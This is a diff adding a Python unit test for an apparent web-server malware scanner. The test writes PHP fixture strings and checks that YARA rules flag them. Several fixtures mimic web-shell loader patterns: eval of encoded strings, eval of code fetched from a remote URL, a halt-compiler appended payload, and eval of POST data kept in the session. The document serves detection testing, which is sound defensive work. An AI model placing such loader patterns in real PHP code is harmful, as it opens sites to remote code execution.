@@ -36,6 +36,28 @@ class ScanTests(unittest.TestCase):
             (domain / 'public_html/index.txt').write_text('normal application content')
         self.config = dict(m.DEFAULTS)
 
+    @unittest.skipUnless(shutil.which('yara') and shutil.which('yarac'), 'real YARA CLI required')
+    def test_indirect_loaders_and_benign_data_handling(self):
+        # Text-only fixtures: these samples are scanned, never passed to PHP.
+        cases = [
+            ('<?php $d=str_rot13("fixture"); eval($d($data));', 'SP_PHP_Indirect_Encoded_Execution'),
+            ('<?php $d="bas e64 _de cod e"; eval($code);', 'SP_PHP_Indirect_Encoded_Execution'),
+            ('<?php $content=file_get_contents("https://invalid.example/fixture"); eval($content);', 'SP_PHP_Remote_Code_Execution'),
+            ('<?php fseek($f,__COMPILER_HALT_OFFSET__); $x=gzinflate($blob); $t=tmpfile(); include $path; __halt_compiler();fixture', 'SP_PHP_Appended_Payload_Loader'),
+            ('<?php $x=base64_decode($_POST["fixture"]); $_SESSION["data"]=$x; eval("comment".$code);', 'SP_PHP_Session_Payload_Execution'),
+            ('<?php echo base64_decode("ordinary data");', ''),
+            ('<?php echo file_get_contents("https://invalid.example/data");', ''),
+        ]
+        for index, (text, expected) in enumerate(cases):
+            path = self.root / f'fixture-{index}.php'
+            path.write_text(text)
+            result = subprocess.run(['yara', str(m.RULES), str(path)], capture_output=True, text=True)
+            self.assertEqual(result.returncode, 0, result.stderr)
+            if expected:
+                self.assertIn(expected, result.stdout)
+            else:
+                self.assertEqual(result.stdout, '')
+
     def report(self):
         return json.loads(sorted(m.REPORTS.glob('scan-*.json'))[-1].read_text())
 
